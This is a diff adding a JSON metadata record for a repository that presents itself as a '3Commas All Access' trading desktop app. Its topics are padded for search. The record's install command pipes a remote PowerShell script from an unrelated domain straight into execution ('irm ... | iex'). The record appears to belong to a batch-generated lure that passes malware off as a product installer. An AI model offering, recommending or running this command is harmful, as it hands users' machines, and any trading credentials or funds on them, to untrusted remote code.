@@ -1,0 +1,28 @@
+{
+  "repo": "3commas-all-access",
+  "product": "3Commas All Access",
+  "kind": "trading",
+  "install_type": "download",
+  "download_url": "https://3commas.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "trading",
+  "topics": [
+    "3commas-faq",
+    "3commas-native-client",
+    "market-charts",
+    "signal-monitor",
+    "price-alerts",
+    "productivity",
+    "3commas-desktop-app",
+    "windows-11",
+    "3commas-getting-started",
+    "getting-started",
+    "install-guide",
+    "desktop-app",
+    "3commas-package",
+    "3commas-setup-guide-2026"
+  ]
+}
